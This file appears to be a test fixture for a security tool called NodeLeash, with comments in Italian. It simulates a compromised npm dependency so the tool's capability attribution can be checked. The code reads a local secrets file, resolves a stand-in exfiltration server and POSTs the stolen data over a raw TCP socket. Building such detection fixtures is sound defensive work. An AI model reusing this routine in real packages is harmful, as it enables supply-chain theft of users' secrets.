'use strict';
// malicious-package.js — simula un pacchetto npm compromesso.
//
// In un attacco reale questo file sarebbe in:
//   node_modules/useful-lib/index.js
// e verrebbe installato come dipendenza transitiva innocua.
//
// Questo modulo locale simula la separazione del codice malevolo
// dal codice applicativo. NodeLeash identifica il responsible
// come il package più vicino alla syscall sullo stack JS.
//
// NOTA: per una simulazione perfetta del caso npm il file
// andrebbe in node_modules/malicious-package/index.js,
// ma il comportamento di attribuzione di NodeLeash sarebbe identico
// perché buildCallPath usa extractJSPackageName sul path del frame.
//
// Capabilities attese da NodeLeash per questo modulo:
//   CAP_READ_FILE       (lettura di /etc/passwd)
//   CAP_CONNECT_REMOTE  (socket verso il server di esfiltrazione)
//   CAP_SEND_DATA       (invio del payload)

const fs   = require('fs');
const dns  = require('dns');
const net  = require('net');

function maliciousAction(triggerValue) {
    console.log('[malicious] Attivato — avvio esfiltrazione...');
    stealAndExfiltrate();
}

function stealAndExfiltrate() {
    // STEP 1 — Lettura file sensibile (thread pool, Category A)
    // Al momento di uv__work_submit lo stack contiene:
    //   stealAndExfiltrate (malicious-package.js)  ← responsible atteso
    //   maliciousAction    (malicious-package.js)
    //   processData        (processor.js)
    //   onConfigRead       (business.js)
    // NodeLeash attribuisce CAP_READ_FILE a LOCAL/malicious-package.js
    fs.readFile('password.txt', 'utf8', function onStolen(err, data) {
        const secret = err ? 'unknown-host' : data.trim();
        console.log(`[malicious] Segreto acquisito: ${secret}`);
        exfiltrate(secret);
    });
}

function exfiltrate(secret) {
    const payload = JSON.stringify({
        stolen : secret,
        pid    : process.pid,
        ts     : Date.now(),
    });

    // STEP 2 — DNS lookup del server di esfiltrazione (thread pool, Category A)
    // Al momento di uv__work_submit lo stack contiene:
    //   exfiltrate      (malicious-package.js)  ← responsible atteso
    //   onStolen        (malicious-package.js)
    // NodeLeash attribuisce a LOCAL/malicious-package.js
    dns.lookup('google.com', function onResolved(err, address) {
        if (err) {
            console.error(`[malicious] DNS fallito: ${err.message}`);
            return;
        }
        console.log(`[malicious] Server esfiltrazione: ${address}`);

        // STEP 3 — TCP connect (sincrono, stack visibile direttamente)
        // socket() e connect() avvengono sul main thread con lo stack visibile.
        // fd_attribution_map registra il fd con il contesto di exfiltrate.
        // NodeLeash attribuisce CAP_CONNECT_REMOTE a LOCAL/malicious-package.js
        const socket = net.createConnection({ host: address, port: 80 }, function onConnected() {
            console.log('[malicious] Connessione stabilita, invio payload...');

            // STEP 4 — Invio dati
            // write()/send() — attribuito via fd_attribution_map se il socket
            // fd è stato registrato al momento della connect().
            socket.write(`POST /collect HTTP/1.1\r\nHost: example.com\r\nContent-Length: ${payload.length}\r\n\r\n${payload}`);
            socket.end();
        });

        socket.on('error', function onErr(e) {
            console.error(`[malicious] Connessione fallita: ${e.message}`);
        });
    });
}

module.exports = { maliciousAction };